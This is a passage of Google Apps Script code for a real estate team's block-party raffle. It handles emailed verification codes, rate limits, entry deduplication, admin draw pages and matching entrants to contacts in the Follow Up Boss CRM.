    // Admin endpoints pick their mode from ?test=1 rather than from the page
    // token, so a rehearsal draw can be fired straight from a bookmark.
    var adminTest = String(e.parameter.test || '') === '1';
    if (action === 'status') return raffleStatusPage_(adminTest);
    if (action === 'console') {
      return raffleWinnerConsolePage_(adminTest, e.parameter.key);
    }
    if (action === 'notifywinner') {
      var sent = raffleSendWinnerEmail_(adminTest);
      return HtmlService.createHtmlOutput(
        '<div style="font-family:system-ui,sans-serif;padding:24px;max-width:520px">' +
        '<h2 style="margin:0 0 10px">' + (sent.ok ? 'Winner emailed' : 'Not sent') + '</h2>' +
        '<p>' + raffleEsc_(sent.message) + '</p></div>');
    }
    return raffleDrawPage_(adminTest, String(e.parameter.force || '') === '1');
  }

  var tmpl = HtmlService.createTemplateFromFile('RaffleForm');
  // A chain entrant arrives already verified (they clicked a link only their own
  // inbox received), so the page opens at the referral step with their session in
  // hand. No chain context = the ordinary first-time flow, unchanged.
  chain = chain || {};
  tmpl.chainVid   = safeJsonForScript_(chain.chainVid || '');
  tmpl.chainFirst = safeJsonForScript_(chain.chainFirst || '');
  if (chain.chainTest) isTest = true;
  tmpl.submitToken   = getSubmitToken();
  tmpl.baseUrl       = baseUrl;
  tmpl.kiosk         = (e.parameter.kiosk || '') ? '1' : '';
  tmpl.qaTestToken   = qaTestToken;   // '' on every normal load
  tmpl.isTest        = isTest ? '1' : '';
  tmpl.prizeShort    = RAFFLE_PRIZE_SHORT;
  tmpl.announceAt    = RAFFLE_ANNOUNCE_AT;
  // The page runs its own clock: it counts down to 3:00, opens itself, and goes
  // dead at 6:15 -- all without a reload. It measures against the SERVER clock,
  // not the visitor's, so a phone with a wrong clock still opens and closes on
  // time. The server re-checks the window on every submit regardless.
  // Derived from RAFFLE_EVENT_AT, never typed a second time -- change the event
  // date in one place and every line on the page follows.
  tmpl.eventDate     = Utilities.formatDate(new Date(RAFFLE_EVENT_AT), RAFFLE_TZ, 'EEEE, MMMM d, yyyy');
  tmpl.eventDateShort= Utilities.formatDate(new Date(RAFFLE_EVENT_AT), RAFFLE_TZ, 'EEEE, MMMM d');
  tmpl.openTime      = Utilities.formatDate(new Date(RAFFLE_EVENT_AT), RAFFLE_TZ, 'h:mm a');
  tmpl.openAtMs      = String(new Date(RAFFLE_OPEN_AT).getTime());
  // The Buyer/Seller timeframe dropdown, fed from FUB live (getFubTimeframes in
  // Code.gs, cached 30 min) exactly like the Open House form's. safeJsonForScript_
  // is what makes it safe to drop into a <script> block.
  var raffleTfList   = raffleTimeframes_();
  tmpl.timeframeList = safeJsonForScript_(raffleTfList);
  tmpl.defaultTimeframe = raffleDefaultTimeframe_(raffleTfList) || '';
  tmpl.closeAtMs     = String(new Date(RAFFLE_CLOSE_AT).getTime());
  tmpl.serverNowMs   = String(Date.now());
  return tmpl.evaluate()
    .setTitle((isTest ? QA_TEST_PREFIX : '') + 'Enter to Win | ' + RAFFLE_EVENT_NAME)
    .addMetaTag('viewport', 'width=device-width, initial-scale=1');
}

// 'before' | 'open' | 'closed' — drives what the page shows on load. The same
// check is re-run server-side on submit; this is presentation only.
function raffleEntryState_() {
  var now = Date.now();
  if (now < new Date(RAFFLE_OPEN_AT).getTime()) return 'before';
  if (now >= new Date(RAFFLE_CLOSE_AT).getTime()) return 'closed';
  return 'open';
}

function raffleStatusPage_(test) {
  var rows = raffleReadEntries_(test);
  var winner = raffleStoredWinner_(test);

  // raffleReadEntries_ returns EVERY row, pending ones included, so the headline
  // number has to be computed rather than taken from rows.length -- that read
  // "N eligible entries" while counting rows nobody had consented to. What is
  // actually worth knowing is how many PEOPLE are in, how many tickets they
  // hold, and how much is still sitting in referrals that have not replied.
  var eligible = rows.filter(function (r) { return r.status === RAFFLE_STATUS_ELIGIBLE; });
  var pending = rows.filter(function (r) { return r.status === RAFFLE_STATUS_PENDING; }).length;
  var people = {}, tickets = 0;
  eligible.forEach(function (r) {
    people[r.emailKey || ('row' + r.row)] = true;
    tickets += Math.max(1, Number(r.tickets) || 1);
  });
  var peopleCount = Object.keys(people).length;

  var html = '<div style="font-family:system-ui,sans-serif;padding:24px;max-width:520px">' +
    (test ? '<div style="background:#b3271e;color:#fff;font-weight:700;padding:10px 12px;' +
            'border-radius:6px;margin-bottom:14px">TEST DATA — not the live raffle</div>' : '') +
    '<h2 style="margin:0 0 4px">' + RAFFLE_EVENT_NAME + '</h2>' +
    '<p style="color:#666;margin:0 0 20px">Entry state: <b>' + raffleEntryState_() + '</b></p>' +
    '<div style="font-size:64px;font-weight:700;color:#15464A;line-height:1">' + peopleCount + '</div>' +
    '<div style="color:#666;margin-bottom:6px">' + (test ? 'TEST ' : '') + 'people entered</div>' +
    '<div style="color:#666;margin-bottom:20px">' + tickets + ' tickets in the draw &middot; ' +
      eligible.length + ' eligible rows &middot; ' + pending + ' referral(s) still pending ' +
      '(worth ' + (pending * RAFFLE_BONUS_TICKETS_PER_REFERRAL) + ' more)</div>';
  if (winner) {
    html += '<div style="background:#15464A;color:#fff;padding:16px;border-radius:8px">' +
      '<div style="opacity:.8;font-size:12px;letter-spacing:1px">WINNER DRAWN ' + raffleEsc_(winner.drawnAt) + '</div>' +
      '<div style="font-size:22px;font-weight:700;margin-top:4px">' + raffleEsc_(winner.winner.name) + '</div></div>';
  } else {
    html += '<p style="color:#666">No winner drawn yet. Draw is armed for ' +
      raffleFmt_(new Date(RAFFLE_DRAW_AT)) + ' ET.</p>';
  }
  html += '</div>';
  return HtmlService.createHtmlOutput(html);
}

function raffleDrawPage_(test, force) {
  var res = raffleDrawWinner_(test, force);
  if (!res.ok) {
    return HtmlService.createHtmlOutput(
      '<div style="font-family:system-ui,sans-serif;padding:24px"><h2>Draw not completed</h2><p>' +
      raffleEsc_(res.error) + '</p></div>');
  }
  var w = res.result.winner;
  var html = '<div style="font-family:system-ui,sans-serif;padding:24px;max-width:520px">' +
    (test ? '<div style="background:#b3271e;color:#fff;font-weight:700;padding:10px 12px;' +
            'border-radius:6px;margin-bottom:14px">TEST DRAW — the real 6:15 draw is untouched</div>' : '') +
    (res.alreadyDrawn ? '<p style="background:#fff3cd;padding:10px;border-radius:6px">' +
      'A winner was already drawn at ' + raffleEsc_(res.result.drawnAt) + '. Showing that result — ' +
      'the draw is deliberately not repeatable.</p>' : '') +
    '<div style="background:#15464A;color:#fff;padding:24px;border-radius:8px;text-align:center">' +
    '<div style="opacity:.8;font-size:12px;letter-spacing:2px">WINNER</div>' +
    '<div style="font-size:30px;font-weight:700;margin:8px 0">' + raffleEsc_(w.name) + '</div>' +
    '<div style="opacity:.9">' + raffleEsc_(w.phone) + '<br>' + raffleEsc_(w.email) + '</div></div>' +
    '<p style="color:#666">Drawn from ' + res.result.totalEligible + ' eligible entries (' +
      res.result.totalPeople + ' people, ' + res.result.totalTickets + ' tickets) at ' +
    raffleEsc_(res.result.drawnAt) + ' ET.</p>';
  if (res.result.backups.length) {
    html += '<p style="color:#666"><b>Backups</b> (if the winner has left):<br>' +
      res.result.backups.map(function (b, i) {
        return (i + 1) + '. ' + raffleEsc_(b.name) + ' — ' + raffleEsc_(b.phone);
      }).join('<br>') + '</p>';
  }
  html += '</div>';
  return HtmlService.createHtmlOutput(html);
}

// ---------- Entry submission (reached from Code.gs's one-line doPost hook) ----------
// checkSubmitToken() and checkRateLimit() have ALREADY run in doPost before this
// is called, as has sanitizeSubmission() and the honeypot check. Do not re-do
// them here; do not skip them by calling this from anywhere else.
function raffleHandleSubmission_(d) {
  // Resolved by setQaTestModeFromPayload_ in doPost, before this hook is
  // reached. Read once here so every branch below agrees on which mode it is.
  var test = isQaTestMode_();
  try {
    var step = String((d && d.step) || 'request').toLowerCase();
    if (step === 'verify')   return raffleVerifyCode_(d, test);
    if (step === 'referral') return raffleSubmitReferral_(d, test);
    if (step === 'invite')   return raffleSendReferralInvite_(d, test);
    // The consent POST comes from the referred person, who has no session and no
    // test-mode token: which tab their row lives in is what decides test-ness.
    if (step === 'consent')  return raffleConsentSubmit_(d);
    // The draw console's own POSTs. Key-gated inside raffleConsoleAction_ -- this
    // is an admin surface reached through the same public doPost as everything
    // else, so it carries its own gate rather than trusting the route.
    if (step === 'console')  return raffleConsoleAction_(d);
    return raffleRequestCode_(d, test);
  } catch (err) {
    if (err && err.isValidation) return jsonOut({ ok: false, error: err.message });
    Logger.log('raffleHandleSubmission_ error: ' + (err && err.stack ? err.stack : err));
    try {
      sendErrorAlert('Raffle: submission exception', (err && err.stack ? err.stack : String(err)));
    } catch (alertErr) { /* never let the alert swallow the response */ }
    return jsonOut({ ok: false, error: 'Something went wrong. Grab someone from TSG and we will get you entered.' });
  }
}

// ---------- Step 1: validate, then email a code ----------
// Writes NOTHING durable. The entry only exists in the script cache, keyed by a
// server-generated id, until the code comes back.
function raffleRequestCode_(d, test) {
  // Window check FIRST. If entries are shut, say so -- do not make someone fix a
  // typo in a field only to then be told they were too late anyway.
  // This is the one check test mode relaxes; see the RAFFLE_TEST_* block.
  var state = raffleEntryState_();
  if (test) {
    Logger.log('RAFFLE TEST MODE: entry-window check BYPASSED (real state was "' + state +
      '"). This is the only check test mode relaxes; the entry is being written to the "' +
      RAFFLE_TEST_SHEET_NAME + '" tab and cannot be drawn as the real winner.');
  } else {
    if (state === 'before') {
      throw makeValidationError('Entries are not open yet. Come find us at the party!');
    }
    if (state === 'closed') {
      throw makeValidationError('Entries are closed — the winner is announced at ' +
        RAFFLE_ANNOUNCE_AT + '. Thanks for coming out!');
    }
  }

  var name  = collapseSpaces(d.fullName);
  if (!name) throw makeValidationError('Enter your full name.');
  if (name.indexOf(' ') === -1) throw makeValidationError('Enter your first and last name.');
  var email  = raffleRejectJunkEmail_(d.email);
  var digits = raffleRejectJunkPhone_(d.phone);
  // collapseSpaces, not trim: trim only strips the ENDS, so a CR/LF pasted
  // mid-value survived into the sheet cell and the FUB record. The name field
  // has always used collapseSpaces; the phone field should never have differed.
  var phone  = collapseSpaces(d.phone);
  if (d.consent !== 'Yes') throw makeValidationError('You must accept the Official Rules to enter.');

  // NO "already entered" SHORT-CIRCUIT ANY MORE. Under the multiplier rules a
  // returning visitor is not a duplicate to be turned away -- they are somebody
  // coming back to refer another person and collect another
  // RAFFLE_BONUS_TICKETS_PER_REFERRAL entries, which is exactly the behaviour
  // worth encouraging. The self-entry row is deduplicated at verification time
  // instead, so coming back cannot mint a second free ticket.

  // The per-address send cap. It matters more now that a returning visitor is no
  // longer short-circuited: without it, somebody could request codes to the same
  // address all afternoon.
  raffleCheckCodeSendQuota_(raffleEmailKey_(email));

  var code = String(Math.floor(100000 + Math.random() * 900000));
  var vid  = Utilities.getUuid();
  CacheService.getScriptCache().put(RAFFLE_PENDING_PREFIX + vid, JSON.stringify({
    name: name, email: email, phone: phone, code: code, attempts: 0, test: !!test
  }), RAFFLE_CODE_TTL_SECONDS);

  // NO bcc HERE, ON PURPOSE. Durand is copied on every other email this project
  // sends (raffleOversightBcc_), but not this one: the six-digit code is a
  // credential, and copying every entrant's code to a second mailbox turns a
  // one-time secret into a standing collection of them. If you are adding
  // oversight copies, this is the email to leave alone.
  MailApp.sendEmail({
    to: email,
    subject: (test ? QA_TEST_PREFIX : '') + 'Your TSG Block Party entry code: ' + code,
    body: [
      'Your entry code is ' + code,
      '',
      'Type it back on the entry page to finish entering the drawing for',
      RAFFLE_PRIZE_SHORT + ' at the TSG Block Party.',
      '',
      'This code expires in 15 minutes. If you did not request it, ignore this email —',
      'nothing has been entered and we will not contact you.',
      '',
      'The Stawasz Group · Keller Williams Empower',
      '728 S Broad St, Philadelphia, PA 19146 · (215) 760-6291'
    ].join('\n')
  });

  Logger.log('Raffle: verification code emailed (vid ' + vid + ', test=' + !!test + ').');
  return jsonOut({ ok: true, needsCode: true, vid: vid,
    message: 'We emailed a 6-digit code to ' + email + '.' });
}

// Throws a validation error -- i.e. a message the entrant sees -- rather than
// failing silently, so a real person who genuinely did not get the first code
// is told what to do (find someone from TSG) instead of tapping a dead button.
//
// Both counters are incremented under the script lock: the read-modify-write on
// a shared cache key is otherwise not atomic, and a concurrent burst is exactly
// the case the cap exists for. Failing to get the lock counts as over-cap
// (fail closed), matching checkRateLimit()'s behaviour in Code.gs.
function raffleCheckCodeSendQuota_(emailKey) {
  var cache = CacheService.getScriptCache();
  var lock = LockService.getScriptLock();
  var haveLock = false;
  try { haveLock = lock.tryLock(1000); } catch (lockErr) { haveLock = false; }
  if (!haveLock) {
    throw makeValidationError('We are sending a lot of codes right now — wait a moment and tap Enter again.');
  }
  try {
    var addrKey = RAFFLE_CODE_SEND_PREFIX + emailKey;
    var addrCount = Number(cache.get(addrKey) || 0);
    if (addrCount >= RAFFLE_CODE_MAX_PER_ADDRESS) {
      Logger.log('Raffle: code-send cap hit for one address (' + addrCount + ' in the last hour).');
      throw makeValidationError('We have already emailed several codes to that address. ' +
        'Check your inbox and spam folder, or grab someone from TSG and we will enter you.');
    }
    var globalKey = RAFFLE_CODE_GLOBAL_PREFIX +
      Math.floor(Date.now() / (RAFFLE_CODE_GLOBAL_WINDOW_SECONDS * 1000));
    var globalCount = Number(cache.get(globalKey) || 0);
    if (globalCount >= RAFFLE_CODE_MAX_GLOBAL) {
      Logger.log('Raffle: GLOBAL code-send ceiling hit (' + globalCount + '). Possible abuse.');
      try {
        sendErrorAlert('Raffle: verification-email ceiling hit',
          'The rolling ' + (RAFFLE_CODE_GLOBAL_WINDOW_SECONDS / 3600) + '-hour ceiling of ' +
          RAFFLE_CODE_MAX_GLOBAL + ' verification emails has been reached, so further codes ' +
          'are being refused to protect the daily send quota (which the Open House form and ' +
          'these alerts also rely on).\n\nIf this is a real crowd and not abuse, raise ' +
          'RAFFLE_CODE_MAX_GLOBAL in RaffleCode.gs and redeploy. If it is abuse, entries can ' +
          'be taken on paper and typed in afterwards.');
      } catch (alertErr) { /* the alert must never swallow the response */ }
      throw makeValidationError('We cannot send codes right now. Grab someone from TSG and ' +
        'we will get you entered.');
    }
    cache.put(addrKey, String(addrCount + 1), RAFFLE_CODE_ADDRESS_WINDOW_SECONDS);
    cache.put(globalKey, String(globalCount + 1), RAFFLE_CODE_GLOBAL_WINDOW_SECONDS);
  } finally {
    try { lock.releaseLock(); } catch (releaseErr) { /* non-fatal */ }
  }
}

// ---------- Step 2: confirm the code, then actually enter them ----------
// Writes the entrant's OWN entry row, once, under the script lock.
//
// Called from TWO places, which is the whole reason it is a function: the code
// path (raffleVerifyCode_) and the chain path (raffleChainStart_). A chain
// entrant proved their inbox by clicking a link only it received, so they are a
// verified entrant by a different route and must get the same one ticket -- the
// chain email tells them they can enter, and for a while it handed them a
// referral form without ever entering them.
//
// Idempotent on purpose: somebody who comes back to refer a second friend must
// not collect a second self-entry.
function raffleEnsureSelfEntry_(name, email, phone, personId, isTest) {
  var selfLock = LockService.getScriptLock();
  var haveSelfLock = false;
  try { haveSelfLock = selfLock.tryLock(10000); } catch (lockErr) { haveSelfLock = false; }
  try {
    var emailKey = raffleEmailKey_(email), phoneKey = rafflePhoneKey_(phone);
    var existingRows = raffleReadEntries_(isTest);
    var alreadyHasSelfEntry = existingRows.some(function (r) {
      return !r.isReferralRow &&
        ((emailKey && r.emailKey === emailKey) || (phoneKey && r.phoneKey === phoneKey));
    });
    if (!alreadyHasSelfEntry) {
      raffleAppendSelfEntry_(name, email, phone, personId || '', isTest);
      if (raffleEntryState_() === 'open') raffleMaybeNotifyMilestone_(isTest);
      return true;
    }
    return false;
  } catch (selfErr) {
    Logger.log('raffleEnsureSelfEntry_: self-entry write failed: ' + selfErr);
    try {
      sendErrorAlert('Raffle: self-entry row failed for ' + name,
        'The entrant verified their email but their own entry row could not be ' +
        'written, so they are NOT in the draw. Add them by hand.\n\n' +
        name + ' / ' + email + ' / ' + phone + '\n\n' + selfErr);
    } catch (alertErr) { /* never swallow the visitor's response */ }
    return false;
  } finally {
    if (haveSelfLock) { try { selfLock.releaseLock(); } catch (relErr) { /* non-fatal */ } }
  }
}

function raffleVerifyCode_(d, test) {
  var cache = CacheService.getScriptCache();
  var vid = String(d.vid || '');
  if (!/^[0-9a-fA-F-]{36}$/.test(vid)) {
    throw makeValidationError('That entry expired. Start again.');
  }
  var key = RAFFLE_PENDING_PREFIX + vid;
  var raw = cache.get(key);
  if (!raw) throw makeValidationError('That code expired. Start again and we will send a new one.');

  var pending = JSON.parse(raw);
  var supplied = String(d.code || '').replace(/\D/g, '');

  if (supplied !== pending.code) {
    pending.attempts = (pending.attempts || 0) + 1;
    if (pending.attempts >= RAFFLE_CODE_MAX_ATTEMPTS) {
      cache.remove(key);
      throw makeValidationError('Too many wrong codes. Start again and we will send a new one.');
    }
    cache.put(key, JSON.stringify(pending), RAFFLE_CODE_TTL_SECONDS);
    throw makeValidationError('That code is not right. Check your email and try again.');
  }

  // Verified. Everything below uses the CACHED values, never anything the client
  // sent with this second request -- otherwise someone could verify one address
  // and enter under a different one.
  cache.remove(key);
  var name = pending.name, email = pending.email, phone = pending.phone;
  var isTest = !!pending.test;

  // 2026-09-17, per Durand: "have the entrant enter all of their info and submit
  // first, then if the entrant exists match to that fub contact, if not just
  // create a new one, so the entrant never knows if they were in the database to
  // begin with or not."
  //
  // So there is no lookup step and no "we found your record" screen. The entrant
  // fills the form in, and the server resolves them against FUB silently:
  // rafflePushToFub_ already does confident match-and-update (one match updates
  // that contact additively, none creates, two+ creates and alerts a human), so
  // an existing client is never duplicated and is never told they were found.
  // The response below is byte-identical either way.
  //
  // This also means a visitor who verifies and then wanders off is still captured
  // as a lead -- they gave their details and accepted the rules before the code
  // was ever sent.
  var fub = rafflePushToFub_(name, email, phone, isTest);
  if (!fub.ok) {
    try {
      sendErrorAlert('Raffle: entrant FUB write failed for ' + name,
        'The entrant verified their email but the FUB write failed. They can still ' +
        'submit a referral -- the raffle row is written to the sheet independently ' +
        'and raffleRetryFubFailures() can re-push afterwards.\n\n' + fub.error);
    } catch (alertErr) { Logger.log('Raffle FUB alert failed: ' + alertErr); }
  }

  // YOU ARE NOW ENTERED. One ticket, the moment the code comes back.
  //
  // This is the change that removes the catastrophic case: while a confirmed
  // referral was REQUIRED, a weekend where nobody's referral replied meant no
  // entrants and no drawing. Verification is proof of a real person with a real
  // inbox who accepted the rules, which is enough to be in the draw. A confirmed
  // referral is then worth RAFFLE_BONUS_TICKETS_PER_REFERRAL more.
  //
  // Written under the lock and only once per person: somebody who comes back to
  // refer a second friend must not collect a second self-entry.
  raffleEnsureSelfEntry_(name, email, phone, (fub && fub.personId) || '', isTest);

  // The verified session. This is what proves, on the NEXT request, that whoever
  // is submitting a referral owns the email address it will be attributed to.
  var session = {
    name: name, email: email, phone: phone,
    personId: (fub && fub.personId) || '',
    test: isTest, verifiedAt: raffleFmt_(raffleNow_())
  };
  cache.put(RAFFLE_VERIFIED_PREFIX + vid, JSON.stringify(session),
            RAFFLE_VERIFIED_TTL_SECONDS);

  return jsonOut({
    ok: true,
    verified: true,
    vid: vid,
    firstName: String(name).split(' ')[0],
    message: 'You are in, ' + String(name).split(' ')[0] + '. Now multiply your odds: ' +
      'refer one person and you get ' + RAFFLE_BONUS_TICKETS_PER_REFERRAL + ' more entries.'
  });
}

function raffleAppendEntry_(name, email, phone, test) {
  var sh = raffleSheet_(test);
  // Every value below that came from the entrant goes through raffleSafeCell_,
  // which prefixes Sheets' text marker to anything starting = + - @ so a typed
  // formula is stored as text instead of executing when the sheet is opened.
  sh.appendRow([
    raffleFmt_(raffleNow_()),
    raffleSafeCell_(name), raffleSafeCell_(email), raffleSafeCell_(phone),
    'Yes', RAFFLE_CONSENT_VERSION,
    test ? (QA_TEST_PREFIX + RAFFLE_EVENT_NAME) : RAFFLE_EVENT_NAME,
    'pending', '', 'Yes', 'Yes (code confirmed)'
  ]);
  return { row: sh.getLastRow() };
}

function raffleRecordFubOutcome_(row, fub, test) {
  var sh = raffleSheet_(test);
  sh.getRange(row, 8).setValue(fub.ok ? 'ok' : ('failed: ' + String(fub.error).slice(0, 200)));
  if (fub.personId) sh.getRange(row, 9).setValue(fub.personId);
}

// Reads every entry row into objects. Small by construction (the party is
// capped at 125), so a full read per submission is cheap and keeps the
// duplicate check reading the same source of truth the draw will.
function raffleReadEntries_(test) {
  var sh = raffleSheet_(test);
  var last = sh.getLastRow();
  if (last < 2) return [];
  var values = sh.getRange(2, 1, last - 1, RAFFLE_SHEET_HEADERS.length).getValues();
  var out = [];
  values.forEach(function (r, idx) {
    // Sheets normally consumes the leading apostrophe raffleSafeCell_ writes, so
    // this is belt-and-braces: strip it on read too, and the value is identical
    // either way. Without it a neutralized cell would key differently from the
    // same address typed again.
    var unmark = function (v) { return String(v || '').replace(/^'/, '').trim(); };
    var name = unmark(r[1]);
    if (!name) return;
    if (String(r[9] || 'Yes').toLowerCase() === 'no') return; // manually disqualified
    out.push({
      row: idx + 2,
      timestamp: r[0],
      name: name,
      email: unmark(r[2]),
      phone: unmark(r[3]),
      emailKey: raffleEmailKey_(unmark(r[2])),
      phoneKey: rafflePhoneKey_(unmark(r[3])),
      fubStatus: String(r[7] || ''),
      fubId: unmark(r[8]),
      // A row written before the referral change has an empty Entry Status.
      // Those rows were real entries under the old rules, so they read as
      // eligible rather than being silently dropped from the draw.
      status: String(r[RAFFLE_COL['Entry Status']] || RAFFLE_STATUS_ELIGIBLE),
      referralName:  unmark(r[RAFFLE_COL['Referral Name']]),
      referralEmail: unmark(r[RAFFLE_COL['Referral Email']]),
      referralPhone: unmark(r[RAFFLE_COL['Referral Phone']]),
      referralRole:  unmark(r[RAFFLE_COL['Referral Role']]),
      referralEmailKey: raffleEmailKey_(unmark(r[RAFFLE_COL['Referral Email']])),
      referralPhoneKey: rafflePhoneKey_(unmark(r[RAFFLE_COL['Referral Phone']])),
      referralFubId: unmark(r[RAFFLE_COL['Referral FUB ID']]),
      referralLoggedAt: unmark(r[RAFFLE_COL['Referral Logged At']]),
      referralEmailedAt: unmark(r[RAFFLE_COL['Referral Emailed At']]),
      chainToken: unmark(r[RAFFLE_COL['Chain Token']]),
      chainEmailedAt: unmark(r[RAFFLE_COL['Chain Emailed At']]),
      reminderSentAt: unmark(r[RAFFLE_COL['Reminder Sent At']]),
      referralTimeframe: unmark(r[RAFFLE_COL['Referral Timeframe']]),
      consentToken: unmark(r[RAFFLE_COL['Consent Token']]),
      // Derived rather than stored: a stored count would need migrating and could
      // drift from the row it describes.
      isReferralRow: !!unmark(r[RAFFLE_COL['Referral Name']]),
      tickets: unmark(r[RAFFLE_COL['Referral Name']]) ? RAFFLE_BONUS_TICKETS_PER_REFERRAL : 1
    });
  });
  return out;
}

// ---------- FUB ----------
// Per Durand 2026-09-16, this does NOT create-and-tag-duplicates the way the
// other forms do. It matches an existing contact confidently, UPDATES it with
// whatever is new, and preserves what was there as a note. Rationale: FUB does
// not merge on email, so a create always makes a second record -- which means
// the raffle tags would land on a brand-new empty record while the real contact,
// with all its history, got nothing.
//
// MATCH CONFIDENCE. Wrongly merging two different people corrupts real CRM data,
// so this is deliberately conservative. A candidate is confident only when:
//   email matches AND (last name OR first name OR phone also matches)
//   -- or --
//   phone matches AND BOTH first and last name match
// Email alone is NOT enough, and phone alone is NOT enough: a couple sharing one
// address or one mobile is the common case, and they are two different people.
// If two or more candidates clear the bar, that is ambiguous, not confident --
// nothing is updated, a new contact is created, and Durand is told so he can
// merge by hand. Names are compared exactly (normalized); no nickname guessing,
// because over-matching is the expensive direction here.
function raffleNorm_(v) {
  return String(v || '').trim().toLowerCase().replace(/[^a-z0-9]/g, '');
}

function raffleFubGet_(url, apiKey) {
  var resp = UrlFetchApp.fetch(url, {
    method: 'get',
    headers: { Authorization: 'Basic ' + Utilities.base64Encode(apiKey + ':') },
    muteHttpExceptions: true
  });
  if (resp.getResponseCode() < 200 || resp.getResponseCode() >= 300) return null;
  try { return JSON.parse(resp.getContentText()); } catch (err) { return null; }
}

// Everything FUB knows that could be this person, by email or by phone.
function raffleFindCandidates_(email, phoneDigits, apiKey) {
  var byId = {};
  [
    'https://api.followupboss.com/v1/people?email=' + encodeURIComponent(email),
    'https://api.followupboss.com/v1/people?phone=' + encodeURIComponent(phoneDigits)
  ].forEach(function (url) {
    var body = raffleFubGet_(url, apiKey);
    ((body && body.people) || []).forEach(function (p) {
      if (p && (p.id || p.id === 0)) byId[p.id] = p;
    });
  });
  return Object.keys(byId).map(function (k) { return byId[k]; });
}

function raffleScoreCandidate_(p, first, last, email, phoneDigits) {
  var emails = (p.emails || []).map(function (e) { return raffleNorm_(e && e.value); });
  var phones = (p.phones || []).map(function (x) { return rafflePhoneKey_(x && x.value); });
  var m = {
    email: emails.indexOf(raffleNorm_(email)) !== -1,
    phone: phones.indexOf(rafflePhoneKey_(phoneDigits)) !== -1,
    first: !!raffleNorm_(first) && raffleNorm_(p.firstName) === raffleNorm_(first),
    last:  !!raffleNorm_(last)  && raffleNorm_(p.lastName)  === raffleNorm_(last)
  };
  m.confident = (m.email && (m.last || m.first || m.phone)) ||
                (m.phone && m.first && m.last);
  m.why = Object.keys(m).filter(function (k) { return k !== 'confident' && k !== 'why' && m[k]; }).join('+');
  return m;
}

// Union of two {value:...} lists, keyed by a normalizer, first list winning.
function raffleMergeValues_(existing, incoming, keyFn) {
  var out = (existing || []).slice();
  var seen = {};
  out.forEach(function (e) { seen[keyFn(e && e.value)] = true; });
  (incoming || []).forEach(function (e) {
    var k = keyFn(e && e.value);
    if (k && !seen[k]) { out.push(e); seen[k] = true; }
  });
  return out;
}

function rafflePushToFub_(name, email, phone, test) {
  try {
    var apiKey = PropertiesService.getScriptProperties().getProperty('FUB_API_KEY');
    if (!apiKey) return { ok: false, error: 'FUB_API_KEY script property is not set.' };

    var parts  = splitName(name);
    var first  = parts.first, last = parts.last;
    var digits = String(phone || '').replace(/\D/g, '');
    var tags   = test ? RAFFLE_TAGS.concat([QA_TEST_TAG]) : RAFFLE_TAGS.slice();

    // ---- 1. Try to recognise them ----
    var confident = [];
    try {
      raffleFindCandidates_(email, digits, apiKey).forEach(function (p) {
        var m = raffleScoreCandidate_(p, first, last, email, digits);
        if (m.confident) confident.push({ person: p, why: m.why });
      });
    } catch (searchErr) {
      Logger.log('Raffle FUB candidate search failed (falling back to create): ' + searchErr);
    }

    if (confident.length === 1) {
      return raffleUpdateExistingFub_(confident[0], name, first, last, email, phone, digits, tags, apiKey, test);
    }
    if (confident.length > 1) {
      // Ambiguous is not confident. Do not guess which record is the real one.
      try {
        sendErrorAlert('Raffle: ambiguous FUB match for ' + name,
          'More than one FUB contact matched confidently, so NOTHING was updated and a new ' +
          'contact was created instead. Merge by hand in FUB:\n\n' +
          confident.map(function (c) {
            return '  #' + c.person.id + '  ' + (c.person.firstName || '') + ' ' +
                   (c.person.lastName || '') + '  (matched on ' + c.why + ')\n' +
                   '  https://' + FUB_SUBDOMAIN + '.followupboss.com/2/people/view/' + c.person.id;
          }).join('\n\n'));
      } catch (alertErr) { Logger.log('Ambiguous-match alert failed: ' + alertErr); }
    }

    // ---- 2. Nobody recognised: create, as before ----
    var payload = {
      firstName: (test ? QA_TEST_PREFIX : '') + first,
      lastName: last,
      source: RAFFLE_SOURCE,
      tags: tags,
      emails: [{ value: email }],
      phones: [{ value: digits }],
      background: (test ? (QA_TEST_BACKGROUND_LEAD_IN + '\n\n') : '') +
                  raffleBackground_(name, email, phone)
    };
    payload[CONSENT_CUSTOM_FIELD] = Utilities.formatDate(raffleNow_(), RAFFLE_TZ, 'yyyy-MM-dd');

    var resp = UrlFetchApp.fetch('https://api.followupboss.com/v1/people', {
      method: 'post',
      contentType: 'application/json',
      headers: { Authorization: 'Basic ' + Utilities.base64Encode(apiKey + ':') },
      payload: JSON.stringify(payload),
      muteHttpExceptions: true
    });
    var code = resp.getResponseCode();
    if (code < 200 || code >= 300) {
      return { ok: false, error: 'FUB /v1/people returned ' + code + ': ' + resp.getContentText().slice(0, 400) };
    }
    var personId = null;
    try { personId = JSON.parse(resp.getContentText()).id; } catch (parseErr) { /* non-fatal */ }
    if (personId) {
      try { raffleAddNote_(personId, name, apiKey, test); }
      catch (noteErr) { Logger.log('Raffle note failed for person ' + personId + ': ' + noteErr); }
    }
    return { ok: true, personId: personId, created: true };

  } catch (err) {
    return { ok: false, error: 'FUB fetch threw: ' + (err && err.message ? err.message : String(err)) };
  }
}

// Confident match: fold the new information into the record that already exists,
// and keep the previous values as a note so nothing is silently overwritten.
function raffleUpdateExistingFub_(match, name, first, last, email, phone, digits, tags, apiKey, test) {
  var id = match.person.id;

  // Re-read the full record: the search result is a summary, and tags/emails/
  // phones have to be merged against what is actually there or the PUT wipes them.
  var cur = raffleFubGet_('https://api.followupboss.com/v1/people/' + id, apiKey) || match.person;
  var before = {
    firstName: cur.firstName || '',
    lastName:  cur.lastName || '',
    emails: (cur.emails || []).map(function (e) { return e && e.value; }).filter(String),
    phones: (cur.phones || []).map(function (p) { return p && p.value; }).filter(String),
    tags:   (cur.tags || []).slice(),
    source: cur.source || ''
  };

  var mergedTags = before.tags.slice();
  tags.forEach(function (t) { if (mergedTags.indexOf(t) === -1) mergedTags.push(t); });

  var payload = {
    // Additive only. An existing address or number is never replaced -- the new
    // one is appended, so a second email or a mobile we did not have is gained
    // rather than the old one being destroyed.
    emails: raffleMergeValues_(cur.emails, [{ value: email }], raffleNorm_),
    phones: raffleMergeValues_(cur.phones, [{ value: digits }], rafflePhoneKey_),
    tags: mergedTags
  };
  // Fill a blank name, never overwrite one that is already set: the CRM's version
  // of someone's name is likelier to be right than what they thumbed in at a party.
  if (!before.firstName && first) payload.firstName = (test ? QA_TEST_PREFIX : '') + first;
  if (!before.lastName && last)   payload.lastName = last;
  // Their original lead source is history and is deliberately left alone; the
  // raffle tags are what record that they came through this event.
